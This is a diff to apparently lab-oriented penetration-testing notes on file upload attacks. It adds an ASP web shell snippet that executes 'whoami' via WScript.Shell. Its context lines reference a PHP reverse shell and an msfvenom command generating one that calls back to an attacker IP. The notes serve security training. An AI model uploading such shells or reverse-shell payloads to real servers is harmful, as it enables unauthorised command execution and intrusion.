@@ -12,6 +12,17 @@
 - Pentestmonkey: https://github.com/pentestmonkey/php-reverse-shell
 - Msfvenom: `L3pr3ch4un@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
 
+**ASPX**
+
+```
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c whoami")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
+
 ## Client Side Validation
 
 We can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.
